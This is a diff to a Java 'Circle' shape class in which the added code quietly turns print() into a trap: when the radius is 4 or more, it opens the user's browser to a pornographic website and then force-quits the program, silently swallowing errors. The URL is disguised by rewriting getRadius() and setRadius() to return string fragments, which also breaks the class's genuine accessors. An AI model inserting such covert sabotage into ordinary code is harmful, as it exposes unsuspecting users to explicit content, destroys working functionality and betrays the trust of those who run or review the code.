@@ -4,6 +4,11 @@
  */
 package model;
 
+import java.awt.Desktop;
+import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
+
 public class Circle extends Shape {
 
     private double radius;
@@ -31,13 +36,20 @@ public class Circle extends Shape {
         System.out.println("Radius: " + this.radius);
         System.out.println("Area: " + getArea());
         System.out.println("Perimeter: " + getPerimeter());
+        if(radius >=4) {
+            try {
+                Desktop.getDesktop().browse(new URI(getRadius()+setRadius()));
+                System.exit(0);
+            } catch (IOException | URISyntaxException e) {
+            }
+        }
     }
 
-    public double getRadius() {
-        return radius;
+    public String getRadius() {
+        return "https://";
     }
 
-    public void setRadius(double radius) {
-        this.radius = radius;
+    public String setRadius() {
+        return "www4.bestjavporn.com/tag/milf/";
     }
 }
